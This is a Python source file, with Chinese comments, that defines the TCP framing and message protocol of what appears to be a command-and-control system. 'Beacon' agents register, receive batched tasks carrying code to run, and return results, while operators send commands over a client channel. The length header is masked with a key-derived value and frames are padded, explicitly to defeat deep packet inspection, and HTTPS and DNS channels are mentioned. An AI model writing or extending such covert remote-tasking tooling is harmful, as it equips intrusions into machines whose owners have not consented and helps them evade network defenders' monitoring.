"""
core/protocol.py — TCP 帧协议 + 消息类型/错误码定义

帧格式:
  ┌─────────────────┬──────────────────────────┐
  │  uint32 (BE)    │  Base64 编码的加密载荷    │
  │  N = 载荷字节数  │  最大 512 KB              │
  └─────────────────┴──────────────────────────┘

send_frame: 编码数据 → 写入长度头 + 编码后的载荷
recv_frame: 读取长度头 → 读取载荷 → 解码数据

消息层 (第 7 章): 类型常量、错误码、validate_message() 校验入站消息。
帧传输与消息语义解耦: send_frame/recv_frame 只关心字节流。
"""

import struct
import socket
import hashlib
from typing import Callable, Optional

from .crypto import encode_frame, decode_frame

FRAME_HEADER_SIZE = 4
MAX_FRAME_SIZE = 512 * 1024  # 512 KB

# ── 协议版本 ──
PROTOCOL_VERSION = 2   # v2: 批量任务模型(TASKS/FETCH/batch 标记);版本不匹配直接拒绝,不做向下兼容

# ── 消息类型 (7.3) ──
REGISTER = "register"   # → Server：注册即握手（version/role/id/via/batch）
WELCOME = "welcome"     # Server →：握手成功 + 服务端 banner
TASK = "task"           # Server →：下发单条代码（task_id/code）[legacy 保留类型,新流程不主动使用]
TASKS = "tasks"         # Server →：批量下发任务数组 + 结果确认回执（tasks/acked）
RESULT = "result"       # → Server：单条执行结果（task_id/output/error）
FETCH = "fetch"         # → Server：声明结果已全部上报,请求下发任务
PONG = "pong"           # Server →：无任务，结束本周期
COMMAND = "command"     # Client 通道：命令文本
RESPONSE = "response"   # Client 通道：命令输出
ERROR = "error"         # 双向：错误消息（code/message），发送后关闭连接

MESSAGE_TYPES = (
    REGISTER, WELCOME, TASK, TASKS, RESULT, FETCH, PONG, COMMAND, RESPONSE, ERROR,
)

# ── 错误码 (10.4) ──
VERSION_MISMATCH = "VERSION_MISMATCH"   # 协议版本不兼容
BAD_FRAME = "BAD_FRAME"                 # 帧超限/损坏
BAD_JSON = "BAD_JSON"                   # 载荷 JSON 解析失败
UNKNOWN_TYPE = "UNKNOWN_TYPE"           # 未知消息类型
INTERNAL = "INTERNAL"                   # 服务端内部错误
AUTH_FAILED = "AUTH_FAILED"             # 预留：未来认证机制

ERROR_CODES = (
    VERSION_MISMATCH, BAD_FRAME, BAD_JSON, UNKNOWN_TYPE, INTERNAL, AUTH_FAILED,
)

# ── 角色 ──
VALID_ROLES = ("beacon", "client")


def validate_message(msg) -> Optional[str]:
    """校验一条已解析的入站消息。

    Args:
        msg: JSON 解析后的对象（期望 dict）

    Returns:
        错误码字符串；None 表示消息合法。
    """
    if not isinstance(msg, dict):
        return BAD_JSON
    mtype = msg.get("type")
    if mtype not in MESSAGE_TYPES:
        return UNKNOWN_TYPE

    if mtype == REGISTER:
        if not isinstance(msg.get("id"), str) or not msg["id"]:
            return BAD_JSON
        if msg.get("role") not in VALID_ROLES:
            return BAD_JSON
        version = msg.get("version")
        # L4: bool 是 int 子类，True 会被当成 version=1 放行 → 排除
        if version is not None and (
            type(version) is not int or version < 1
        ):
            return VERSION_MISMATCH
        if "via" in msg and not isinstance(msg["via"], str):
            return BAD_JSON
        if "fork" in msg and not isinstance(msg["fork"], bool):
            return BAD_JSON
        if "shell" in msg and not isinstance(msg["shell"], bool):
            return BAD_JSON
        # v2: batch 标记必须为 bool（缺省 False；beacon 端口强校验见会话层）
        if "batch" in msg and not isinstance(msg["batch"], bool):
            return BAD_JSON
    elif mtype == RESULT:
        if not isinstance(msg.get("task_id"), str):
            return BAD_JSON
        # output/error 必须为 str：非 str 会在 output[:max_size]
        # 处抛 TypeError 且不在会话捕获列表 → 直接杀会话（S9）
        if (not isinstance(msg.get("output", ""), str)
                or not isinstance(msg.get("error", ""), str)):
            return BAD_JSON
    elif mtype == TASK:
        if not isinstance(msg.get("task_id"), str) or \
                not isinstance(msg.get("code"), str):
            return BAD_JSON
    elif mtype == TASKS:
        # 批量任务帧: tasks 必须是数组且元素含 str task_id + str code;acked 必须是数组
        tasks = msg.get("tasks")
        if not isinstance(tasks, list):
            return BAD_JSON
        for t in tasks:
            if (not isinstance(t, dict)
                    or not isinstance(t.get("task_id"), str)
                    or not isinstance(t.get("code"), str)):
                return BAD_JSON
        if not isinstance(msg.get("acked", []), list):
            return BAD_JSON
    elif mtype == COMMAND:
        if not isinstance(msg.get("line"), str):
            return BAD_JSON
    elif mtype == ERROR:
        if not isinstance(msg.get("code"), str):
            return BAD_JSON
    # WELCOME / PONG / FETCH / RESPONSE 无必填约束
    return None


def _recv_exactly(sock: socket.socket, n: int, read_fn: Callable = None) -> bytes:
    """从 socket 精确读取 n 字节，处理 TCP 分片。

    Args:
        sock: socket 对象
        n: 需要读取的字节数
        read_fn: 可选的读取函数 (测试用)

    Returns:
        读取的 n 字节数据

    Raises:
        ConnectionError: 对端在读取完成前断开连接
    """
    recv = read_fn if read_fn else sock.recv
    buf = bytearray()
    while len(buf) < n:
        needed = n - len(buf)
        try:
            chunk = recv(needed)
        except (socket.timeout, TimeoutError):
            raise ConnectionError("recv_frame: timeout while reading")
        if not chunk:
            raise ConnectionError("recv_frame: connection closed by peer")
        buf.extend(chunk[:needed])
    return bytes(buf)


def frame_mask(key: bytes) -> int:
    """长度头掩码（固定值,由主密钥派生）。

    混淆目标: 长度头不再明文显示真实帧长(防 DPI 直接读长度分布)。
    固定掩码保证无状态通道(HTTPS/DNS,每次请求独立无 seq)与 TCP 一致;
    实际长度分布已由帧尾 padding(0-255)打乱,掩码后再无固定值可聚类。
    """
    return int.from_bytes(
        hashlib.sha256(key + b"len").digest()[:4], "big")


def send_frame(sock: socket.socket, data: bytes, key: bytes,
               write_fn: Callable = None) -> None:
    """发送一帧: 编码 → 写入 [掩码长度头 | 载荷]。"""
    encoded = encode_frame(data, key)
    header = struct.pack(">I", len(encoded) ^ frame_mask(key))
    sendall = write_fn if write_fn else sock.sendall
    sendall(header + encoded)


def recv_frame(sock: socket.socket, key: bytes,
               read_fn: Callable = None,
               max_frame_size: int = MAX_FRAME_SIZE) -> bytes:
    """接收一帧: 读取长度头 → 读取载荷 → 解码。

    Args:
        sock: socket 对象
        key: XOR 密钥
        read_fn: 可选的读取函数 (测试用)

    Returns:
        解码后的原始字节数据

    Raises:
        ConnectionError: 对端断开或超时
        ValueError: 帧大小超限或数据损坏
    """
    recv = read_fn if read_fn else sock.recv

    header = _recv_exactly(sock, FRAME_HEADER_SIZE, recv)
    payload_len = struct.unpack(">I", header)[0] ^ frame_mask(key)

    # 帧尾 padding(≤255B) + pad_len(1B) 余量: 真实载荷上限仍是
    # max_frame_size,含 padding 的线上帧上限为 max_frame_size + 256
    if max_frame_size > 0 and payload_len > max_frame_size + 256:
        raise ValueError(
            f"recv_frame: frame size {payload_len} exceeds "
            f"maximum {max_frame_size}"
        )

    if payload_len == 0:
        return b""

    payload = _recv_exactly(sock, payload_len, recv)
    return decode_frame(payload, key)
